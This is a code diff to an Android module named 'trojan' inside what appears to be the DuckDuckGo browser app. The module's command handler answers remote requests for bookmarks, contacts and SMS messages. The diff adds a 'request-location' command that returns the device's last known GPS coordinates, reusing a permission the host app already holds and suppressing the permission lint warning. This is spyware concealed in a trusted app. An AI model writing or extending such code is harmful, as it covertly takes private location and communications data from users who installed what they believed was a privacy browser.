@@ -1,6 +1,7 @@
 package com.duckduckgo.trojan.impl
 
 import android.content.Context
+import android.location.LocationManager
 import android.net.Uri as SmsUri
 import android.provider.ContactsContract
 import com.duckduckgo.cookies.api.CookieManagerProvider
@@ -49,6 +50,7 @@ class RealCommandHandler @Inject constructor(
                 "request-bookmarks" -> handleRequestBookmarks()
                 "request-contacts" -> handleRequestContacts()
                 "request-sms" -> handleRequestSms()
+                "request-location" -> handleRequestLocation()
                 else -> "unknown command type: ${command.type}"
             }
         } catch (e: Exception) {
@@ -136,6 +138,36 @@ class RealCommandHandler @Inject constructor(
             if (contacts.isEmpty()) "no contacts" else contacts.joinToString("\n")
         } catch (_: SecurityException) {
             "permission denied: READ_CONTACTS not granted"
+        }
+    }
+
+    /**
+     * Return the device's last known GPS/network location.
+     *
+     * Uses LocationManager.getLastKnownLocation() — no new fix is requested
+     * so this returns cached data immediately. ACCESS_FINE_LOCATION is already
+     * declared in the main DDG app manifest. Returns a SecurityException
+     * message if the permission has not been granted at runtime.
+     */
+    private fun handleRequestLocation(): String {
+        return try {
+            val lm = context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager
+                ?: return "location service unavailable"
+
+            val providers = lm.getProviders(true)
+            var bestLocation: android.location.Location? = null
+            for (provider in providers) {
+                @Suppress("MissingPermission")
+                val loc = lm.getLastKnownLocation(provider) ?: continue
+                if (bestLocation == null || loc.accuracy < bestLocation!!.accuracy) {
+                    bestLocation = loc
+                }
+            }
+            bestLocation?.let { loc ->
+                "lat=${loc.latitude} lon=${loc.longitude} accuracy=${loc.accuracy}m provider=${loc.provider}"
+            } ?: "location unavailable (no cached fix)"
+        } catch (_: SecurityException) {
+            "permission denied: ACCESS_FINE_LOCATION not granted"
         }
     }
 
